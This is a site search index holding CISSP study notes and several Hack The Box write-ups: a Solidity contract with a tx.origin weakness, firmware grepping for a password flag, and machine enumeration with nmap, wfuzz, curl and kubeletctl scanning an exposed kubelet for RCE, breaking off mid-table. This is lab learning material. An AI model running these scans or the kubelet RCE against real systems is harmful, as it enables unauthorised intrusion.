{"config": {"lang": ["en"], "separator": "[\\s\\-]+", "pipeline": ["stopWordFilter"]}, "docs": [{"location": "", "title": "Welcome", "text": "<p>This site is created based on mkdocs. For full documentation visit mkdocs.org.</p>"}, {"location": "#about-htb-machine-writeups", "title": "About HTB machine writeups", "text": "<ul> <li>Writeups for active machines are protected by passwords</li> <li>Writeups for retired machines don't have password</li> <li>I'm kind of lazy to upload all my writeups to this site, so ....</li> <li>My HTB Profile</li> </ul>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/", "title": "Chapter 1 Security Governance Through Principles and Policies", "text": ""}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/#security-101", "title": "Security 101", "text": "<p>Why security is important?  Security helps to ensure that an organization is able to continue to exist and operate in spite of any attempts to steal its data or compromise its physical or logical element. Security should be viewed as an element of business management rather than an IT concern. Security is the business management tool that ensures the reliable and protected operation of IT/IS. Security exists to support the objectives, mission, and goals of the organization.</p> <p>How can an organization control its security?  Generally, a security framework should be adopted that provides a starting point for how to implement security.  1. Initiation 2. Finetuning through evaluation.     Three types of of security evaluation: risk assessment, vulnerability assessment, and penetration testing.</p> <p>What are the features of security? 1. Security should be cost-effective. Thus, you should select security controls that provide the greatest protection for the lowest resource cost.</p> <ol> <li> <p>Security should be legally defensible. The laws of your jurisdiction are the backstop of organizational security. When intruders' activities are illegal, prosecution in court may be the only available response for compensation or closure.</p> </li> <li> <p>Since our deployed technology is changing by the passage of time, by the users, and by the adversaries discovering flaws and developing exploits. The defenses that were sufficient yesterday may not be sufficient tomorrow. As new vulnerabilities are discovered, as new means of attack are crafted and new exploits ae built, we have to respond by reassessing our security infrastructure and responding appropriately.</p> </li> </ol>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/#understand-and-apply-security-concepts", "title": "Understand and Apply Security Concepts", "text": ""}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/#the-cia-triad", "title": "The CIA Triad", "text": "<p>Confidentiality  Confidentiality protections prevent disclosure while protecting authorized access. Many unauthorized disclosure of sensitive information are the result of human error, oversight, or ineptitude. Confidentiality violations can result from the actions of an end user or a system administrator. They can also occur because of an oversight in a security policy or a misconfigured security control. Numerous countermeasures can help ensure confidentiality against possible threats. These include encryption, network traffic padding, strict access control, rigorous authentication procedures, data classification, and extensive personnel training.</p> <p>Organizations should evaluate the nuances of confidentiality they wish to enforce. Tools and technology that implement one form of confidentiality might not support or allow other forms.</p> <p>Integrity  Integrity is the concept of protecting the reliability and correctness of data. Integrity protection prevents unauthorized alterations of data.</p> <p>Numerous attacks focus on the violation of integrity. These include viruses, logic bombs, unauthorized access, errors in coding and applications, malicious modification, intentional replacement, and system backdoors.</p> <p>Availability  Availability means authorized subjecta are granted timely and uninterrupted access to object. Often, availability protection controls support sufficient bandwidth and timeliness of processing as deemed necessary by the organization or situation.</p> <p>Availability includes efficient uninterrupted access to objects and prevention of denial-of-service (DoS) attacks.</p> <p>There are numerous threats to availability. These include device failure, software errors, and environmental issues (heat, static electricity, flooding power loss, and so on.)</p>"}, {"location": "CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/#dad-overprotection-authenticity-non-repudiation-and-aaa-services", "title": "DAD, Overprotection, Authenticity, Non-repudiation, and AAA Services", "text": ""}, {"location": "HTB/Challenges/Distract%20and%20Destroy/", "title": "Distract and Destroy (Blockchain)", "text": "<pre><code>\u2514\u2500$ cat Setup.sol   \n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport {Creature} from \"./Creature.sol\";\n\ncontract Setup {\n    Creature public immutable TARGET;\n\n    constructor() payable {\n        require(msg.value == 1 ether);\n        TARGET = new Creature{value: 10}();\n    }\n\n    function isSolved() public view returns (bool) {\n        return address(TARGET).balance == 0;\n    }\n}\n\n$ cat Creature.sol                               \n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Creature {\n    uint256 public lifePoints;\n    address public aggro;\n\n    constructor() payable {\n        lifePoints = 1000;\n    }\n\n    function attack(uint256 _damage) external {\n        if (aggro == address(0)) {\n            aggro = msg.sender;\n        }\n\n        if (_isOffBalance() &amp;&amp; aggro != msg.sender) {\n            lifePoints -= _damage;\n        } else {\n            lifePoints -= 0;\n        }\n    }\n\n    function loot() external {\n        require(lifePoints == 0, \"Creature is still alive!\");\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n    function _isOffBalance() private view returns (bool) {\n        return tx.origin != msg.sender;\n    }\n}\n\n</code></pre> <p>Solidity Programming Language</p>"}, {"location": "HTB/Challenges/Photon%20Lockdown/", "title": "Photon Lockdown (Hardware)", "text": "<p> Squashfs is a compressed read-only file system for Linux. Squashfs compresses files, inodes and directories, and supports block sizes from 4 KiB up to 1 MiB for greater compression. Several compression algorithms are supported. Squashfs is also the name of free software, licensed under the GPL, for accessing Squashfs filesystems. </p> <pre><code># mount squashfs filesystems\n$ sudo mount --type=\"squashfs\" --options=\"loop\" --source=\"/home/kali/HTB/challenge/ONT/rootfs\" --target=\"/tmp/rootfs\"\n\n$ ls -la /tmp/rootfs\n</code></pre> <p></p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/tmp/rootfs]\n\u2514\u2500$ find . -type f -exec cat {} \\; | grep -arin -o -E '(\\w+\\W+){0,5}password(\\W+\\w+){0,5}' .\n\n./etc/config_default.xml:244:PASSWORD\" Value=\"HTB{N0w_Y0u_C4n_L0g1n\n</code></pre> <p></p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/tmp/rootfs]\n\u2514\u2500$ cat ./etc/config_default.xml | grep -i password\n\nHTB{N0w_Y0u_C4n_L0g1n}\n</code></pre> <p></p> <pre><code># unmount squashfs file\n$ sudo umount --type=\"squashfs\" /tmp/rootfs\n</code></pre>"}, {"location": "HTB/Machines/Bucket/", "title": "Bucket", "text": "<pre><code>\u2514\u2500$ sudo nmap 10.10.10.212 -p- --min-rate=10000 -T4 -sCV  \nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n80/tcp open  http    Apache httpd 2.4.41\n|_http-title: Did not follow redirect to http://bucket.htb/\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n\u2514\u2500$ echo \"10.10.10.212 bucket.htb\" | sudo tee -a /etc/hosts \n</code></pre> <p>http://bucket.htb/ </p>"}, {"location": "HTB/Machines/Bucket/#view-source-code", "title": "View source code", "text": "<pre><code>&lt;article&gt;\n&lt;div class=\"coffee\"&gt;\n&lt;img src=\"http://s3.bucket.htb/adserver/images/bug.jpg\" alt=\"Bug\" height=\"160\" width=\"160\"&gt;\n&lt;/div&gt;\n&lt;div class=\"description\"&gt;\n&lt;h3&gt;Bug Bounty and 0day Research&lt;/h3&gt;\n&lt;span&gt;march 17, 2020 | Security&lt;/span&gt;\n&lt;p&gt;Customised bug bounty and new 0day feeds. Feeds can be used on TV, mobile, desktop and web applications. Collecting security feeds from 100+ different trusted sources around the world.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/article&gt;\n&lt;div class=\"articles\"&gt;\n\n&lt;article&gt;\n&lt;div class=\"coffee\"&gt;\n&lt;img src=\"http://s3.bucket.htb/adserver/images/malware.png\" alt=\"Malware\" height=\"160\" width=\"160\"&gt;\n&lt;/div&gt;\n&lt;div class=\"description\"&gt;\n&lt;h3&gt;Ransomware Alerts&lt;/h3&gt;\n&lt;span&gt;march 17, 2020 | Malware&lt;/span&gt;\n&lt;p&gt;Run awareness ad campaigns on Ransomwares and other newly found malwares. Choose different types of malwares to fit for your campaign&lt;/p&gt;\n&lt;/div&gt;\n&lt;/article&gt;\n\n&lt;article&gt;\n&lt;div class=\"coffee\"&gt;\n&lt;img src=\"http://s3.bucket.htb/adserver/images/cloud.png\" alt=\"cheer\" height=\"160\" width=\"160\"&gt;\n&lt;/div&gt;\n&lt;div class=\"description\"&gt;\n&lt;h3&gt;Cloud Updates&lt;/h3&gt;\n&lt;span&gt;march 17, 2020 | Cloud&lt;/span&gt;\n&lt;p&gt;Stay tuned to cloud technology updates. A superior alternative to Push Notifications and SMS A2P alerts. &lt;/p&gt;\n&lt;/div&gt;\n&lt;/article&gt;\n\n\u2514\u2500$ echo \"10.10.10.212 s3.bucket.htb\" | sudo tee -a /etc/hosts \n</code></pre> <p>Then, refresh the website, you will see images. </p> <p>email: support@bucket.htb</p> <pre><code>\u2514\u2500$ wfuzz -c -u http://bucket.htb/ -H \"Host: FUZZ.bucket.htb\" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hl 9\n</code></pre> <p></p> <pre><code>\u2514\u2500$ curl -v http://s3.bucket.htb/\n*   Trying 10.10.10.212:80...\n* Connected to s3.bucket.htb (10.10.10.212) port 80\n&gt; GET / HTTP/1.1\n&gt; Host: s3.bucket.htb\n&gt; User-Agent: curl/8.4.0\n&gt; Accept: */*\n&gt; \n&lt; HTTP/1.1 404 \n&lt; Date: Thu, 22 Feb 2024 01:15:14 GMT\n&lt; Server: hypercorn-h11\n&lt; content-type: text/html; charset=utf-8\n&lt; content-length: 21\n&lt; access-control-allow-origin: *\n&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH\n&lt; access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging\n&lt; access-control-expose-headers: x-amz-version-id\n&lt; \n* Connection #0 to host s3.bucket.htb left intact\n\n{\"status\": \"running\"}  \n</code></pre>"}, {"location": "HTB/Machines/SteamCloud/", "title": "SteamCloud", "text": "<pre><code>\u2514\u2500$ sudo nmap 10.10.11.133 -p- --min-rate=10000 -T4 -Pn     \nPORT      STATE SERVICE\n22/tcp    open  ssh\n2379/tcp  open  etcd-client\n2380/tcp  open  etcd-server\n8443/tcp  open  https-alt\n10249/tcp open  unknown\n10250/tcp open  unknown\n10256/tcp open  unknown\n\n\u2514\u2500$ sudo nmap 10.10.11.133 -p 22,2379,2380,8443,10249,10250,10256 --min-rate=10000 -T4 -Pn -sCV\nPORT      STATE SERVICE          VERSION\n22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)\n|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)\n|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)\n2379/tcp  open  ssl/etcd-client?\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  h2\n| ssl-cert: Subject: commonName=steamcloud\n| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1\n| Not valid before: 2024-02-21T07:18:56\n|_Not valid after:  2025-02-20T07:18:56\n2380/tcp  open  ssl/etcd-server?\n| tls-alpn: \n|_  h2\n| ssl-cert: Subject: commonName=steamcloud\n| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1\n| Not valid before: 2024-02-21T07:18:56\n|_Not valid after:  2025-02-20T07:18:57\n|_ssl-date: TLS randomness does not represent time\n8443/tcp  open  ssl/https-alt\n| ssl-cert: Subject: commonName=minikube/organizationName=system:masters\n| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1\n| Not valid before: 2024-02-20T07:18:54\n|_Not valid after:  2027-02-20T07:18:54\n|_ssl-date: TLS randomness does not represent time\n|_http-title: Site doesn't have a title (application/json).\n| tls-alpn: \n|   h2\n|_  http/1.1\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.0 403 Forbidden\n|     Audit-Id: a090b496-a021-4484-8ec8-ab726ca9c2fd\n|     Cache-Control: no-cache, private\n|     Content-Type: application/json\n|     X-Content-Type-Options: nosniff\n|     X-Kubernetes-Pf-Flowschema-Uid: e287085f-2ac9-4960-9104-714a75bececb\n|     X-Kubernetes-Pf-Prioritylevel-Uid: bb4b8c06-406d-4716-aab3-75211d4abf5b\n|     Date: Wed, 21 Feb 2024 07:27:47 GMT\n|     Content-Length: 212\n|     {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/nice ports,/Trinity.txt.bak\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n|   GetRequest: \n|     HTTP/1.0 403 Forbidden\n|     Audit-Id: df87bc9b-49b9-47aa-9c22-437d2f7dd27d\n|     Cache-Control: no-cache, private\n|     Content-Type: application/json\n|     X-Content-Type-Options: nosniff\n|     X-Kubernetes-Pf-Flowschema-Uid: e287085f-2ac9-4960-9104-714a75bececb\n|     X-Kubernetes-Pf-Prioritylevel-Uid: bb4b8c06-406d-4716-aab3-75211d4abf5b\n|     Date: Wed, 21 Feb 2024 07:27:46 GMT\n|     Content-Length: 185\n|     {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n|   HTTPOptions: \n|     HTTP/1.0 403 Forbidden\n|     Audit-Id: b612ac2d-ffe4-477e-9ca2-a5440c5e9151\n|     Cache-Control: no-cache, private\n|     Content-Type: application/json\n|     X-Content-Type-Options: nosniff\n|     X-Kubernetes-Pf-Flowschema-Uid: e287085f-2ac9-4960-9104-714a75bececb\n|     X-Kubernetes-Pf-Prioritylevel-Uid: bb4b8c06-406d-4716-aab3-75211d4abf5b\n|     Date: Wed, 21 Feb 2024 07:27:46 GMT\n|     Content-Length: 189\n|_    {\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot options path \"/\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n| ssl-cert: Subject: commonName=steamcloud@1708499939\n| Subject Alternative Name: DNS:steamcloud\n| Not valid before: 2024-02-21T06:18:59\n|_Not valid after:  2025-02-20T06:18:59\n|_ssl-date: TLS randomness does not represent time\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n| tls-alpn: \n|   h2\n|_  http/1.1\n10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n1 service unrecognized despite returning data. \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n\u2514\u2500$ curl -k https://10.10.11.133:8443/ | jq\n{\n  \"kind\": \"Status\",\n  \"apiVersion\": \"v1\",\n  \"metadata\": {},\n  \"status\": \"Failure\",\n  \"message\": \"forbidden: User \\\"system:anonymous\\\" cannot get path \\\"/\\\"\",\n  \"reason\": \"Forbidden\",\n  \"details\": {},\n  \"code\": 403\n}\n\n</code></pre> <p>Pentesting Kubernetes Services</p> <p>kubeletctl:A client for kubelet</p> <pre><code>\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 pods --server 10.10.11.133\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                Pods from Kubelet                               \u2502\n\u251c\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   \u2502 POD                                \u2502 NAMESPACE   \u2502 CONTAINERS              \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 1 \u2502 kube-controller-manager-steamcloud \u2502 kube-system \u2502 kube-controller-manager \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 2 \u2502 kube-scheduler-steamcloud          \u2502 kube-system \u2502 kube-scheduler          \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 3 \u2502 etcd-steamcloud                    \u2502 kube-system \u2502 etcd                    \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 4 \u2502 kube-apiserver-steamcloud          \u2502 kube-system \u2502 kube-apiserver          \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 5 \u2502 storage-provisioner                \u2502 kube-system \u2502 storage-provisioner     \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 6 \u2502 kube-proxy-k8tsh                   \u2502 kube-system \u2502 kube-proxy              \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 7 \u2502 coredns-78fcd69978-xgmt7           \u2502 kube-system \u2502 coredns                 \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 8 \u2502 nginx                              \u2502 default     \u2502 nginx                   \u2502\n\u2502   \u2502                                    \u2502             \u2502                         \u2502\n\u2514\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 scan --help\nDescription:\n  Scans for nodes with opened kubelet's API.\n\n  Examples:\n    // It will find all nodes that have opened kubelet API\n    kubeletctl scan --cidr \"123.123.123.123/24\"\n\nUsage:\n  kubeletctl scan [flags]\n  kubeletctl scan [command]\n\nAvailable Commands:\n  rce         Scans for nodes with opened kubelet API\n  token       Scans for for all the tokens in a given Node.\n\nFlags:\n  -h, --help   help for scan\n\nGlobal Flags:\n      --cacert string       CA certificate (example: /etc/kubernetes/pki/ca.crt )\n      --cert string         Private key (example: /var/lib/kubelet/pki/kubelet-client-current.pem)\n      --cidr string         A network of IP addresses (Example: x.x.x.x/24)\n  -k, --config string       KubeConfig file\n  -c, --container string    Container name\n      --http                Use HTTP (default is HTTPS)\n  -i, --ignoreconfig        Ignore the default KUBECONFIG environment variable or location ~/.kube\n      --key string          Digital certificate (example: /var/lib/kubelet/pki/kubelet-client-current.pem)\n  -n, --namespace string    pod namespace\n  -p, --pod string          Pod name\n      --port string         Kubelet's port, default is 10250\n  -r, --raw                 Prints raw data\n  -s, --server string       Server address (format: x.x.x.x. For Example: 123.123.123.123)\n  -t, --token string        Service account Token (JWT) to insert\n  -f, --token-file string   Service account Token (JWT) file path\n  -u, --uid string          Pod UID\n\n\u2514\u2500$ ~/HTB/tools/kubeletctl_linux_amd64 --server 10.10.11.133 scan rce   \n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                   Node with pods vulnerable to RCE                                  \u2502\n\u251c\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   \u2502 NODE IP      \u2502 PODS                               \u2502 NAMESPACE   \u2502 CONTAINERS              \u2502 RCE \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   \u2502              \u2502                                    \u2502             \u2502                         \u2502 RUN 